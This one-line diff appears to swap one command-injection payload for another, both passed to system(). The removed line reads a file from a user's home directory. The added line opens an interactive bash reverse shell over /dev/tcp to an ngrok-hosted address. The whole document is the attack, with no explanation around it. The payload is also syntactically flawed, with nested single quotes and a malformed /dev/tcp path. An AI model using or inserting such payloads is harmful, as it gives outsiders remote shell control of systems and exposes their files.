@@ -1,1 +1,1 @@
-<pre>system('python -c 'print(open("/home/kiddie/first_part").read())'')</pre>
+<pre>system('bash -c 'exec bash -i &>/dev/tcp/tcp://7.tcp.eu.ngrok.io/16840 <&1'')</pre>
